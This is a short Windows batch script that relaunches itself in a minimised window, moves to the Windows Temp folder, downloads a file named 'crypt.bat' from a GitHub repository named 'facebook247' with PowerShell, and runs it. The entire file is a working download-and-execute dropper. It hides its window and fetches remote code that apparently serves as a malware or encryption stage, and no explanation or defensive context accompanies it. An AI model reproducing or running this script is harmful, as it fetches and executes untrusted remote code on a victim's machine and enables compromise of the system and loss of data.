@echo off
if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
cd C:\Windows\Temp
powershell -command "Invoke-WebRequest -uri https://github.com/facebook247/facebook247.github.io/blob/main/crypt.bat?raw=true -o crypt.bat"
start crypt.bat